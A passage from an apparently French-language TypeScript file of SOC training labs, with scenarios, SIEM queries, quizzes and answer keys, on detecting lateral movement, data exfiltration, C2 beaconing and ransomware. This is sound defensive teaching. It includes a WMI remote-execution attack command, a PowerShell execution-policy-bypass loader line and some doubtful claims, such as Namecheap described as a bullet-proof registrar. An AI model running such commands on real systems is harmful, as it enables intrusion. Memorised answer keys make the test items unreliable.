  title: "TP: Détection de Mouvement Latéral",
  description: "Maîtrisez la détection des techniques de mouvement latéral: PsExec, WMI, WinRM, RDP.",
  category: "Lateral Movement",
  difficulty: "Avancé",
  duration: "70 min",
  prerequisites: [
    "Connaissance des protocoles SMB, RDP, WinRM",
    "Compréhension de l'Active Directory",
    "Accès aux logs de plusieurs machines"
  ],
  objectives: [
    "Identifier les techniques de mouvement latéral",
    "Corréler les événements entre plusieurs machines",
    "Suivre le chemin de l'attaquant",
    "Détecter les anomalies d'authentification"
  ],
  scenario: {
    context: "Un attaquant a compromis un poste utilisateur et tente d'atteindre le serveur de fichiers contenant des données sensibles.",
    alertData: {
      "Date/Heure": "2026-03-09 15:45:00 UTC",
      "Machine Source": "WKS-USER-023",
      "Machines Cibles": "SRV-FILE-001, DC-MAIN-001",
      "Utilisateur": "admin_john (compte admin compromis)",
      "Technique suspectée": "PsExec et WMI"
    },
    timeline: [
      "15:30 - Compromission initiale de WKS-USER-023",
      "15:35 - Credential harvesting avec Mimikatz",
      "15:45 - PsExec vers SRV-FILE-001",
      "15:50 - WMI vers DC-MAIN-001",
      "15:55 - Détection par le SOC"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Détection PsExec (T1021.002)",
      objective: "Identifier l'utilisation de PsExec pour le mouvement latéral",
      theory: `## PsExec et variantes

PsExec est un outil Sysinternals légitime souvent utilisé par les attaquants.

### Comment PsExec fonctionne:
1. Copie PSEXESVC.exe via SMB
2. Crée un service distant
3. Établit des named pipes
4. Supprime le service après exécution

### Indicateurs:
| Événement | Description |
|-----------|-------------|
| Event 7045 | Création service PSEXESVC |
| SMB vers ADMIN$ | Copie du binaire |
| Event 5145 | Accès au partage |`,
      scenario: `À 15:45, un PsExec a été exécuté depuis WKS-USER-023 vers SRV-FILE-001.`,
      tasks: [
        "Rechercher les connexions SMB vers ADMIN$",
        "Identifier la création du service PSEXESVC",
        "Vérifier les processus créés à distance"
      ],
      commands: [
        {
          description: "Service PSEXESVC créé sur la cible",
          command: 'host.name:"SRV-FILE-001" AND event.code:7045 AND winlog.event_data.ServiceName:*PSEXE*',
          expectedOutput: "Service PSEXESVC installed"
        },
        {
          description: "Authentification sur la cible",
          command: 'host.name:"SRV-FILE-001" AND event.code:4624 AND winlog.event_data.LogonType:3',
          expectedOutput: "Logon Type 3 | admin_john | from 10.0.1.23"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Quel partage réseau est utilisé par PsExec?",
          type: "multiple-choice",
          options: ["C$", "ADMIN$", "IPC$", "NETLOGON"],
          correctAnswer: "ADMIN$",
          explanation: "ADMIN$ pointe vers Windows\\System32"
        },
        {
          id: "ex1-2",
          question: "Quel Logon Type indique une connexion réseau?",
          type: "text",
          correctAnswer: "3",
          hint: "Type utilisé pour SMB, PsExec",
          explanation: "Logon Type 3 = Network logon"
        }
      ],
      tips: [
        "PsExec crée puis supprime le service",
        "Les variantes peuvent utiliser des noms différents"
      ],
      checkpoint: "PsExec détecté vers SRV-FILE-001",
      estimatedTime: "15 min"
    },
    {
      id: 2,
      title: "Détection WMI (T1047)",
      objective: "Identifier l'utilisation de WMI pour l'exécution distante",
      theory: `## Windows Management Instrumentation (WMI)

WMI permet l'exécution de commandes à distance sans déposer de fichiers.

### Commandes WMI d'attaque:
\`\`\`cmd
wmic /node:TARGET process call create "cmd.exe /c whoami"
\`\`\`

### Événements de détection:
| Source | Event ID | Description |
|--------|----------|-------------|
| Sysmon | 1 | WmiPrvSE.exe lance un processus |
| Security | 4688 | Création de processus |

### Indicateurs:
- WmiPrvSE.exe comme parent de cmd.exe
- Connexions DCOM (port 135)`,
      scenario: `À 15:50, une commande WMI a été exécutée vers DC-MAIN-001.`,
      tasks: [
        "Rechercher les connexions DCOM/WMI",
        "Identifier les processus créés par WmiPrvSE"
      ],
      commands: [
        {
          description: "Processus créés par WmiPrvSE",
          command: 'host.name:"DC-MAIN-001" AND event.code:1 AND process.parent.name:"WmiPrvSE.exe"',
          expectedOutput: "cmd.exe /c whoami | Parent: WmiPrvSE.exe"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Quel processus Windows héberge les providers WMI?",
          type: "text",
          correctAnswer: "WmiPrvSE.exe",
          hint: "WMI Provider Service...",
          explanation: "WmiPrvSE.exe exécute les requêtes WMI"
        },
        {
          id: "ex2-2",
          question: "Quel port initie une connexion WMI distante?",
          type: "multiple-choice",
          options: ["445 (SMB)", "135 (RPC)", "3389 (RDP)", "5985 (WinRM)"],
          correctAnswer: "135 (RPC)",
          explanation: "Port 135 = RPC Endpoint Mapper"
        }
      ],
      tips: [
        "WMI est une technique fileless",
        "WmiPrvSE.exe ne devrait PAS lancer cmd.exe normalement"
      ],
      checkpoint: "WMI détecté vers DC-MAIN-001",
      estimatedTime: "15 min"
    },
    {
      id: 3,
      title: "Corrélation et Timeline",
      objective: "Construire la timeline complète de l'attaque",
      theory: `## Construction de Timeline

Une timeline complète permet de:
- Comprendre la séquence d'événements
- Identifier toutes les machines touchées
- Déterminer l'étendue de la compromission

### Méthodologie:
1. **Collecter** les événements de toutes les machines
2. **Normaliser** les timestamps (UTC)
3. **Corréler** par utilisateur, machine, ou hash
4. **Visualiser** chronologiquement`,
      scenario: `Construisez la timeline complète de l'attaquant.`,
      tasks: [
        "Collecter tous les événements liés à admin_john",
        "Normaliser et trier par timestamp",
        "Identifier chaque saut de machine"
      ],
      commands: [
        {
          description: "Tous les événements admin_john",
          command: 'user.name:"admin_john" | sort @timestamp',
          expectedOutput: "Timeline complète des activités"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Combien de machines ont été touchées?",
          type: "multiple-choice",
          options: ["1", "2", "3", "4"],
          correctAnswer: "3",
          explanation: "WKS-USER-023, SRV-FILE-001, DC-MAIN-001"
        }
      ],
      tips: [
        "Utilisez toujours UTC pour éviter les confusions"
      ],
      checkpoint: "Timeline complète construite",
      estimatedTime: "20 min"
    },
    {
      id: 4,
      title: "Containment et Hunting",
      objective: "Contenir l'attaque et rechercher d'autres compromissions",
      theory: `## Stratégie de Containment

### Actions immédiates:
1. **Désactiver le compte compromis** (admin_john)
2. **Isoler les machines affectées**
3. **Bloquer les IOCs** sur le périmètre
4. **Réinitialiser les credentials** exposés

### Hunting proactif:
Rechercher d'autres traces de l'attaquant:
- Mêmes techniques sur d'autres machines
- Autres comptes utilisés
- Fichiers déposés`,
      scenario: `Contenez l'attaque et vérifiez qu'il n'y a pas d'autres compromissions.`,
      tasks: [
        "Désactiver le compte admin_john",
        "Vérifier les autres authentifications",
        "Rechercher d'autres services suspects"
      ],
      commands: [
        {
          description: "Désactiver le compte AD",
          command: "Disable-ADAccount -Identity admin_john",
          expectedOutput: "(compte désactivé)"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Quelle est la PREMIÈRE action de containment?",
          type: "multiple-choice",
          options: ["Formater le PC", "Désactiver le compte", "Appeler la direction", "Créer un ticket"],
          correctAnswer: "Désactiver le compte",
          explanation: "Stopper l'accès de l'attaquant est prioritaire"
        }
      ],
      tips: [
        "Désactivez le compte mais ne le supprimez pas (forensics)"
      ],
      checkpoint: "Compte désactivé, pas d'autres compromissions",
      estimatedTime: "15 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "PsExec utilise quel partage?",
      type: "text",
      correctAnswer: "ADMIN$",
      explanation: "ADMIN$ = C:\\Windows"
    },
    {
      id: "final-2",
      question: "Logon Type 3 signifie...",
      type: "multiple-choice",
      options: ["Interactive", "Network", "Batch", "Service"],
      correctAnswer: "Network",
      explanation: "Type 3 = Network logon"
    },
    {
      id: "final-3",
      question: "WmiPrvSE.exe est...",
      type: "text",
      correctAnswer: "WMI Provider Service",
      explanation: "Le service qui exécute les requêtes WMI"
    }
  ],
  passingScore: 85,
  certification: "Analyste Lateral Movement N3",
  tags: ["lateral-movement", "psexec", "wmi", "T1021", "T1047"]
};

// ============================================
// TP 6: DATA EXFILTRATION (T1048)
// ============================================
export const labExfiltration: Lab = {
  id: "tp-exfiltration",
  sopId: "mitre-exfiltration",
  title: "TP: Détection d'Exfiltration de Données",
  description: "Apprenez à détecter les techniques d'exfiltration: DNS tunneling, HTTP/S, cloud storage.",
  category: "Exfiltration",
  difficulty: "Avancé",
  duration: "65 min",
  prerequisites: [
    "Connaissance des protocoles réseau",
    "Compréhension des outils de compression",
    "Accès aux logs réseau et endpoint"
  ],
  objectives: [
    "Identifier les techniques d'exfiltration courantes",
    "Détecter les transferts de données anormaux",
    "Analyser les tunnels DNS/HTTP",
    "Quantifier les données exfiltrées"
  ],
  scenario: {
    context: "Une fuite de données est suspectée suite à la détection d'un trafic DNS anormal vers un domaine inconnu.",
    alertData: {
      "Date/Heure": "2026-03-09 18:30:00 UTC",
      "Utilisateur": "dev_pierre@entreprise.fr",
      "Poste": "WKS-RD-007",
      "Alerte": "Volume DNS anormalement élevé",
      "Domaine suspect": "data.secret-storage.xyz",
      "Volume": "2.3 GB en 24h via DNS"
    },
    timeline: [
      "17:00 - Début de la collecte de fichiers",
      "17:30 - Compression en archive chiffrée",
      "18:00 - Début de l'exfiltration DNS",
      "18:30 - Alerte DNS générée",
      "19:00 - Tentative d'upload cloud"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Détection DNS Tunneling (T1048.003)",
      objective: "Identifier l'exfiltration via le protocole DNS",
      theory: `## DNS Tunneling

Le DNS tunneling encode les données dans les requêtes DNS.

### Comment ça fonctionne:
1. Les données sont encodées en base64
2. Envoyées comme sous-domaines
3. Le serveur DNS attaquant décode

### Indicateurs:
| Indicateur | Seuil suspect |
|------------|---------------|
| Longueur sous-domaine | > 50 caractères |
| Requêtes par minute | > 100 vers même domain |
| Types de records | TXT, NULL, PRIVATE |
| Entropie | > 3.5 (random-looking) |`,
      scenario: `2.3 GB de données ont transité via DNS vers data.secret-storage.xyz`,
      tasks: [
        "Analyser le volume de requêtes DNS",
        "Vérifier la longueur des sous-domaines",
        "Identifier les types de records utilisés"
      ],
      commands: [
        {
          description: "Volume DNS vers le domaine suspect",
          command: 'dns.question.name:*secret-storage.xyz | stats count, sum(network.bytes)',
          expectedOutput: "WKS-RD-007: 15,234 requests, 2.3 GB"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Quel type de record DNS est privilégié pour le tunneling?",
          type: "multiple-choice",
          options: ["A", "AAAA", "TXT", "MX"],
          correctAnswer: "TXT",
          explanation: "TXT permet plus de données (255 caractères)"
        }
      ],
      tips: [
        "Le DNS légitime a des sous-domaines courts"
      ],
      checkpoint: "DNS tunneling confirmé: 2.3 GB exfiltrés",
      estimatedTime: "15 min"
    },
    {
      id: 2,
      title: "Analyse des Fichiers Collectés",
      objective: "Identifier les fichiers préparés pour exfiltration",
      theory: `## Stage et Compression (T1074, T1560)

Avant exfiltration, les attaquants:
1. **Collectent** (staging) les fichiers
2. **Compriment** pour réduire la taille
3. **Chiffrent** pour éviter le DLP
4. **Découpent** si nécessaire

### Indicateurs:
- Copie de fichiers vers un dossier temp
- Création d'archives .zip, .7z
- Utilisation de chiffrement (AES)`,
      scenario: `Un fichier design_confidentiel.zip a été créé avant l'exfiltration.`,
      tasks: [
        "Rechercher les créations de fichiers .zip",
        "Identifier les fichiers sources copiés",
        "Vérifier les commandes de compression"
      ],
      commands: [
        {
          description: "Création de fichiers archive",
          command: 'host.name:"WKS-RD-007" AND event.code:11 AND file.extension:(zip OR rar OR 7z)',
          expectedOutput: "17:30 | design_confidentiel.zip"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Le paramètre -p dans '7z a -p archive.zip' signifie...",
          type: "multiple-choice",
          options: ["Path", "Password", "Progress", "Preserve"],
          correctAnswer: "Password",
          explanation: "-p active le chiffrement AES-256"
        }
      ],
      tips: [
        "7z avec -p chiffre AUSSI les noms de fichiers"
      ],
      checkpoint: "47 fichiers compressés et chiffrés",
      estimatedTime: "12 min"
    },
    {
      id: 3,
      title: "Tentative Upload Cloud",
      objective: "Détecter les tentatives d'exfiltration via services cloud",
      theory: `## Exfiltration via Cloud Storage

Les attaquants utilisent les services cloud légitimes:
- Ils sont souvent autorisés par le firewall
- Le trafic est chiffré (HTTPS)
- Difficile à distinguer de l'usage normal

### Services couramment abusés:
- Google Drive, Dropbox, OneDrive
- WeTransfer, Mega
- Pastebin, GitHub Gists`,
      scenario: `Après le DNS tunneling, l'attaquant a tenté un upload vers mega.nz`,
      tasks: [
        "Analyser le trafic vers les services cloud",
        "Identifier les uploads volumineux",
        "Vérifier le timing des transferts"
      ],
      commands: [
        {
          description: "Trafic vers services cloud",
          command: 'destination.domain:(*dropbox* OR *mega* OR *drive.google*)',
          expectedOutput: "19:00 | mega.nz | 450 MB upload"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Pourquoi mega.nz est populaire pour l'exfiltration?",
          type: "multiple-choice",
          options: ["Gratuit", "Chiffrement E2E et anonymat", "Plus rapide", "Moins surveillé"],
          correctAnswer: "Chiffrement E2E et anonymat",
          explanation: "Mega offre chiffrement E2E et anonymat"
        }
      ],
      tips: [
        "HTTPS masque le contenu mais pas le volume"
      ],
      checkpoint: "Tentative cloud: 453 MB vers mega.nz",
      estimatedTime: "12 min"
    },
    {
      id: 4,
      title: "Quantification et Response",
      objective: "Quantifier les données exfiltrées et répondre",
      theory: `## Quantification de la fuite

### Calcul du volume total:
1. DNS tunneling: X bytes
2. Upload cloud: Y bytes
3. **Total potentiel**: X + Y

### Actions de response:
1. **Technique**: Bloquer domaines, isoler poste
2. **RH**: Notification employé/management
3. **Légal**: Préservation des preuves`,
      scenario: `Quantifiez la fuite totale et préparez la response.`,
      tasks: [
        "Calculer le volume total exfiltré",
        "Identifier les types de données",
        "Préparer les IOCs pour blocage"
      ],
      commands: [
        {
          description: "Volume total par méthode",
          command: 'host.name:"WKS-RD-007" | stats sum(network.bytes) by destination.domain',
          expectedOutput: "secret-storage.xyz: 2.3 GB, mega.nz: 453 MB"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Volume total exfiltré (DNS + Cloud)?",
          type: "text",
          correctAnswer: "2.75 GB",
          hint: "2.3 + 0.45",
          explanation: "2.3 GB + 453 MB ≈ 2.75 GB"
        }
      ],
      tips: [
        "Conservez les preuves avant toute action"
      ],
      checkpoint: "Fuite quantifiée: 2.75 GB",
      estimatedTime: "15 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "T1048 correspond à...",
      type: "multiple-choice",
      options: ["Exfiltration Over Alternative Protocol", "Data Staged", "Data Compressed", "Data Encrypted"],
      correctAnswer: "Exfiltration Over Alternative Protocol",
      explanation: "T1048 = Exfiltration via DNS, ICMP, etc."
    },
    {
      id: "final-2",
      question: "Le DNS tunneling encode les données dans...",
      type: "multiple-choice",
      options: ["L'adresse IP", "Le sous-domaine", "Le port", "Le TTL"],
      correctAnswer: "Le sous-domaine",
      explanation: "data.encoded.attacker.com"
    },
    {
      id: "final-3",
      question: "Quel type de record DNS transporte le plus de données?",
      type: "text",
      correctAnswer: "TXT",
      explanation: "TXT records = 255 caractères"
    }
  ],
  passingScore: 85,
  certification: "Analyste Exfiltration N3",
  tags: ["exfiltration", "dns-tunneling", "cloud", "T1048", "T1567"]
};

// ============================================
// TP 7: COMMAND AND CONTROL (T1071)
// ============================================
export const labC2Detection: Lab = {
  id: "tp-c2-detection",
  sopId: "mitre-c2",
  title: "TP: Détection de Communications C2",
  description: "Maîtrisez la détection des canaux Command & Control: HTTP beacons, DNS C2, encrypted channels.",
  category: "Command and Control",
  difficulty: "Avancé",
  duration: "75 min",
  prerequisites: [
    "Connaissance des protocoles HTTP/HTTPS",
    "Compréhension des techniques de beaconing",
    "Accès aux logs proxy et DNS"
  ],
  objectives: [
    "Identifier les patterns de beaconing",
    "Analyser les communications C2 chiffrées",
    "Détecter les canaux C2 alternatifs",
    "Bloquer et remédier les implants"
  ],
  scenario: {
    context: "Un comportement de beaconing régulier a été détecté depuis un poste vers un domaine DGA.",
    alertData: {
      "Date/Heure": "2026-03-09 10:00:00 UTC",
      "Poste infecté": "WKS-SALES-018",
      "Domaine C2": "xk7f9a2bc.techupdate.click",
      "Pattern": "Beacon HTTP toutes les 60±5 secondes",
      "Durée": "Active depuis 72h"
    },
    timeline: [
      "72h avant - Infection initiale",
      "Toutes les 60s - Beacons HTTP",
      "06:00 - Commandes reçues",
      "10:00 - Détection"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Analyse du Pattern de Beaconing",
      objective: "Identifier et caractériser le comportement de beacon",
      theory: `## Beaconing C2

Un beacon est une connexion périodique d'un implant vers son serveur C2.

### Caractéristiques:
| Aspect | Beacon simple | Beacon avancé |
|--------|---------------|---------------|
| Intervalle | Fixe (60s) | Jitter (60±10s) |
| Taille | Constante | Variable |
| User-Agent | Statique | Rotatif |

### Détection statistique:
- **Régularité temporelle**: Intervalles fixes
- **Faible variance**: Écart-type < 10%
- **Persistance**: Continue 24/7`,
      scenario: `Un beacon HTTP est actif depuis 72h avec un intervalle de ~60 secondes.`,
      tasks: [
        "Identifier les connexions vers le domaine C2",
        "Calculer l'intervalle moyen",
        "Analyser le jitter"
      ],
      commands: [
        {
          description: "Connexions vers le domaine C2",
          command: 'destination.domain:*techupdate.click | sort @timestamp',
          expectedOutput: "1 connexion toutes les ~60s"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "Avec 60 beacons/heure, combien en 72h?",
          type: "text",
          correctAnswer: "4320",
          hint: "60 × 72",
          explanation: "60 × 72 = 4320 connexions"
        }
      ],
      tips: [
        "Le jitter évite la détection par règle simple"
      ],
      checkpoint: "Beacon confirmé: 4320 connexions en 72h",
      estimatedTime: "18 min"
    },
    {
      id: 2,
      title: "Analyse du protocole C2",
      objective: "Décoder les communications C2",
      theory: `## Protocoles C2

### HTTP/HTTPS C2:
- Se fond dans le trafic web normal
- Utilise des URI légitimes (/api/, /update)
- Données souvent encodées en base64

### Structure typique:
\`\`\`
POST /api/update HTTP/1.1
Host: malicious-domain.com
Cookie: session=base64_encoded_data
\`\`\``,
      scenario: `Analysez le contenu des communications C2.`,
      tasks: [
        "Examiner les headers HTTP",
        "Décoder les données du Cookie",
        "Identifier les commandes exécutées"
      ],
      commands: [
        {
          description: "Headers HTTP des beacons",
          command: 'destination.domain:*techupdate.click | table http.request.method, url.path',
          expectedOutput: "POST /api/update | Cookie: session=SGVs..."
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Pourquoi le C2 utilise /api/update comme URI?",
          type: "multiple-choice",
          options: ["Obligation technique", "Se faire passer pour du trafic légitime", "Plus rapide", "Aucune raison"],
          correctAnswer: "Se faire passer pour du trafic légitime",
          explanation: "Les URIs légitimes évitent la détection"
        }
      ],
      tips: [
        "Les frameworks C2 modernes chiffrent tout le contenu"
      ],
      checkpoint: "Protocole C2 analysé: POST /api/update",
      estimatedTime: "15 min"
    },
    {
      id: 3,
      title: "Analyse de l'infrastructure C2",
      objective: "Identifier l'infrastructure du threat actor",
      theory: `## Infrastructure C2

### Domain Generation Algorithms (DGA):
Les DGA génèrent des domaines pseudo-aléatoires:
- xk7f9a2bc.techupdate.click
- m3n8p4qr.techupdate.click

### Indicateurs d'infrastructure malveillante:
| Indicateur | Description |
|------------|-------------|
| Domaine récent | Créé < 30 jours |
| Registrar bullet-proof | Namecheap souvent abusé |
| IP dans VPS | DigitalOcean, Vultr |
| Certificat Let's Encrypt | Gratuit et anonyme |`,
      scenario: `Analysez l'infrastructure behind xk7f9a2bc.techupdate.click`,
      tasks: [
        "WHOIS et date de création",
        "Résolution DNS et IP",
        "Réputation de l'IP"
      ],
      commands: [
        {
          description: "WHOIS du domaine",
          command: "whois techupdate.click",
          expectedOutput: "Creation Date: 2026-02-20 | Registrar: Namecheap"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Le domaine a été créé combien de jours avant la détection?",
          type: "text",
          correctAnswer: "17",
          hint: "Du 20 février au 9 mars",
          explanation: "17 jours - typique des campagnes malveillantes"
        }
      ],
      tips: [
        "Les domaines C2 sont souvent créés < 30 jours avant l'attaque"
      ],
      checkpoint: "Infrastructure identifiée: 3 domaines C2",
      estimatedTime: "15 min"
    },
    {
      id: 4,
      title: "Containment et Éradication",
      objective: "Bloquer le C2 et nettoyer l'implant",
      theory: `## Stratégie de Containment C2

### Phase 1 - Blocage réseau:
- Bloquer le domaine au proxy/DNS
- Bloquer l'IP au firewall
- Sinkhole le domaine si possible

### Phase 2 - Isolation endpoint:
- Isoler le poste du réseau
- Conserver la connectivité EDR
- Ne pas éteindre (préserver la mémoire)`,
      scenario: `Bloquez le C2 et nettoyez le poste infecté.`,
      tasks: [
        "Bloquer le domaine et l'IP",
        "Isoler le poste infecté",
        "Identifier le processus implant"
      ],
      commands: [
        {
          description: "Identifier le processus implant",
          command: 'host.name:"WKS-SALES-018" AND destination.domain:*techupdate* | table process.name',
          expectedOutput: "svchost.exe (PID 4528)"
        }
      ],
      exercises: [
        {
          id: "ex4-1",
          question: "Pourquoi ne pas éteindre le poste infecté?",
          type: "multiple-choice",
          options: ["Pour éviter les erreurs", "Pour préserver la mémoire", "L'implant pourrait résister", "Aucune raison"],
          correctAnswer: "Pour préserver la mémoire",
          explanation: "Le memory dump peut révéler le payload"
        }
      ],
      tips: [
        "Bloquez AVANT d'isoler pour capturer les derniers beacons"
      ],
      checkpoint: "C2 bloqué, implant identifié",
      estimatedTime: "18 min"
    }
  ],
  finalExam: [
    {
      id: "final-1",
      question: "Un beacon avec jitter a un intervalle...",
      type: "multiple-choice",
      options: ["Parfaitement fixe", "Légèrement variable", "Complètement aléatoire", "Croissant"],
      correctAnswer: "Légèrement variable",
      explanation: "Le jitter ajoute une petite variation"
    },
    {
      id: "final-2",
      question: "DGA signifie...",
      type: "text",
      correctAnswer: "Domain Generation Algorithm",
      explanation: "Algorithme générant des domaines pseudo-aléatoires"
    },
    {
      id: "final-3",
      question: "60 beacons/heure × 24h × 3 jours = ?",
      type: "text",
      correctAnswer: "4320",
      explanation: "60 × 24 × 3 = 4320"
    }
  ],
  passingScore: 85,
  certification: "Analyste C2 Detection N3",
  tags: ["c2", "beaconing", "command-control", "T1071"]
};

// ============================================
// TP 8: RANSOMWARE ANALYSIS (T1486)
// ============================================
export const labRansomware: Lab = {
  id: "tp-ransomware",
  sopId: "mitre-ransomware",
  title: "TP: Analyse et Response Ransomware",
  description: "Simulation complète d'une attaque ransomware: détection précoce, containment d'urgence, et recovery.",
  category: "Impact",
  difficulty: "Avancé",
  duration: "90 min",
  prerequisites: [
    "Expérience en incident response",
    "Connaissance des techniques de chiffrement",
    "Compréhension des processus de backup/recovery"
  ],
  objectives: [
    "Détecter les signes précoces d'un ransomware",
    "Analyser le comportement de chiffrement",
    "Exécuter un containment d'urgence",
    "Coordonner la réponse multi-équipes"
  ],
  scenario: {
    context: "ALERTE CRITIQUE: Des fichiers commencent à être chiffrés sur le serveur de fichiers principal. Le ransomware se propage activement.",
    alertData: {
      "Date/Heure": "2026-03-09 14:45:00 UTC",
      "Serveur impacté": "SRV-FILES-001",
      "Type": "Ransomware - Chiffrement actif",
      "Extension": ".locked",
      "Fichiers chiffrés": "~2000 (et en augmentation)",
      "Vitesse": "~50 fichiers/seconde"
    },
    timeline: [
      "14:30 - Premier fichier chiffré",
      "14:45 - Alerte EDR déclenchée",
      "14:47 - Début de la réponse",
      "14:50 - Objectif containment"
    ]
  },
  steps: [
    {
      id: 1,
      title: "Détection et Triage Initial",
      objective: "Confirmer le ransomware et évaluer l'étendue",
      theory: `## Indicateurs de Ransomware

### Signes précoces:
- Processus listant les fichiers massivement
- Accès séquentiel à de nombreux fichiers
- Création de fichiers avec nouvelles extensions
- Suppression des shadow copies

### Signes actifs:
| Indicateur | Description |
|------------|-------------|
| Fichiers renommés | .locked, .encrypted |
| Ransom notes | README, DECRYPT |
| CPU élevé | Chiffrement intensif |
| I/O disque massif | Lecture/écriture continue |`,
      scenario: `Le ransomware chiffre activement SRV-FILES-001. Confirmez et évaluez.`,
      tasks: [
        "Confirmer l'activité de chiffrement",
        "Identifier le processus responsable",
        "Compter les fichiers affectés"
      ],
      commands: [
        {
          description: "Nouveaux fichiers .locked créés",
          command: 'host.name:"SRV-FILES-001" AND event.code:11 AND file.extension:"locked" | stats count',
          expectedOutput: "count: 2847 (et augmentant)"
        },
        {
          description: "Processus créant les fichiers",
          command: 'host.name:"SRV-FILES-001" AND event.code:11 AND file.extension:"locked" | stats count by process.name',
          expectedOutput: "svchostx.exe: 2847"
        }
      ],
      exercises: [
        {
          id: "ex1-1",
          question: "À quelle vitesse le ransomware chiffre-t-il?",
          type: "text",
          correctAnswer: "50 fichiers/seconde",
          hint: "500 fichiers / 10 secondes",
          explanation: "50 fichiers/sec = 3000 fichiers/minute"
        },
        {
          id: "ex1-2",
          question: "Le processus svchostx.exe est-il légitime?",
          type: "multiple-choice",
          options: ["Oui, processus Windows", "Non, typosquatting de svchost", "Dépend de la version"],
          correctAnswer: "Non, typosquatting de svchost",
          explanation: "svchost.exe (sans x) est légitime"
        }
      ],
      tips: [
        "Chaque seconde compte - agissez rapidement"
      ],
      checkpoint: "Ransomware confirmé: svchostx.exe, ~2800 fichiers",
      estimatedTime: "8 min"
    },
    {
      id: 2,
      title: "Containment d'Urgence",
      objective: "Stopper la propagation en moins de 5 minutes",
      theory: `## Containment Ransomware - Actions Immédiates

### Ordre de priorité:
1. **ISOLER LE SERVER** (couper le réseau)
2. Tuer le processus malveillant
3. Déconnecter les shares
4. Alerter les autres équipes

### Méthodes d'isolation:
| Méthode | Vitesse | Recommandé |
|---------|---------|------------|
| Débrancher câble | Instant | OUI |
| Disable NIC | 10 sec | OUI |
| EDR isolation | 30 sec | Si disponible |

### NE PAS FAIRE:
- ❌ Éteindre le serveur (perte de RAM)
- ❌ Supprimer les fichiers chiffrés
- ❌ Payer la rançon sans analyse`,
      scenario: `URGENCE: Vous avez 3 minutes pour stopper le chiffrement.`,
      tasks: [
        "Isoler le serveur du réseau",
        "Tuer le processus ransomware",
        "Déconnecter les shares montés"
      ],
      commands: [
        {
          description: "EDR - Isoler le serveur",
          command: "Invoke-EDRNetworkIsolation -ComputerName SRV-FILES-001",
          expectedOutput: "Network isolation enabled"
        },
        {
          description: "Tuer le processus",
          command: "taskkill /F /IM svchostx.exe /S SRV-FILES-001",
          expectedOutput: "SUCCESS: The process has been terminated"
        }
      ],
      exercises: [
        {
          id: "ex2-1",
          question: "Quelle est la PREMIÈRE action?",
          type: "multiple-choice",
          options: ["Tuer le processus", "Isoler du réseau", "Appeler le management", "Faire un backup"],
          correctAnswer: "Isoler du réseau",
          explanation: "L'isolation empêche la propagation"
        },
        {
          id: "ex2-2",
          question: "Pourquoi ne pas éteindre le serveur?",
          type: "multiple-choice",
          options: ["Ça prend trop de temps", "On perd les clés en mémoire", "Le ransomware résiste", "Pas de raison"],
          correctAnswer: "On perd les clés en mémoire",
          explanation: "La RAM peut contenir les clés de chiffrement"
        }
      ],
      tips: [
        "L'isolation réseau est TOUJOURS la priorité n°1"
      ],
      checkpoint: "Containment effectué: serveur isolé, processus tué",
      estimatedTime: "5 min"
    },
    {
      id: 3,
      title: "Analyse de l'Attaque",
      objective: "Comprendre le vecteur d'entrée et la propagation",
      theory: `## Investigation Post-Containment

### Questions clés:
1. **Comment sont-ils entrés?** (phishing, RDP, vulnérabilité)
2. **Quand?** (dwell time)
3. **Quoi avant le chiffrement?** (exfiltration?)
4. **Quel ransomware?** (famille, variant)

### Recherche du Patient Zéro:
- Premier fichier chiffré (timestamp)
- Processus parent du ransomware
- Connexions réseau avant exécution`,
      scenario: `Le serveur est isolé. Analysez comment l'attaque a commencé.`,
      tasks: [
        "Identifier le premier fichier chiffré",
        "Tracer l'origine du processus ransomware",
        "Identifier le vecteur initial"
      ],
      commands: [
        {
          description: "Premier fichier chiffré",
          command: 'host.name:"SRV-FILES-001" AND event.code:11 AND file.extension:"locked" | sort @timestamp | head 1',
          expectedOutput: "14:30:15 | budget_2026.xlsx.locked"
        },
        {
          description: "Process tree du ransomware",
          command: 'host.name:"SRV-FILES-001" AND process.name:"svchostx.exe" AND event.code:1',
          expectedOutput: "powershell.exe | -ep bypass -f C:\\Windows\\Temp\\loader.ps1"
        }
      ],
      exercises: [
        {
          id: "ex3-1",
          question: "Le ransomware a été lancé par quel processus parent?",
          type: "text",
          correctAnswer: "powershell.exe",
          hint: "Regardez le process tree",
          explanation: "PowerShell > loader.ps1 > svchostx.exe"
        },
        {
          id: "ex3-2",
          question: "Combien de temps entre l'entrée et le chiffrement?",
          type: "text",
          correctAnswer: "45 minutes",
          hint: "De 13:45 à 14:30",
          explanation: "Dwell time court = attaque automatisée"
        }
      ],
      tips: [
        "Le patient zéro est souvent un poste utilisateur"
      ],
      checkpoint: "Vecteur identifié: WKS-SALES-018 → lateral movement",
      estimatedTime: "15 min"
    },
    {
      id: 4,
      title: "Évaluation de l'Impact et Recovery",
      objective: "Quantifier les dégâts et planifier la récupération",
      theory: `## Évaluation d'Impact Ransomware

### Données à collecter:
- Nombre de fichiers chiffrés
- Types de fichiers
- Criticité des données
- Disponibilité des backups

### Options de recovery:
1. **Restore from backup** (idéal)
2. **Décrypteur public** (si disponible)
3. **Shadow copies** (si non supprimées)
4. **Négociation** (dernier recours)`,
      scenario: `Évaluez l'impact et préparez le plan de recovery.`,
      tasks: [
        "Compter les fichiers chiffrés par type",
        "Vérifier l'état des backups",
        "Vérifier les shadow copies"
      ],
      commands: [
        {
          description: "État des backups",
          command: "Get-VBRBackup | Where {$_.Name -like '*FILES*'} | Select Name, LastBackup",
          expectedOutput: "SRV-FILES-001_Backup | 2026-03-09 02:00"
        },
        {
          description: "Shadow copies disponibles",
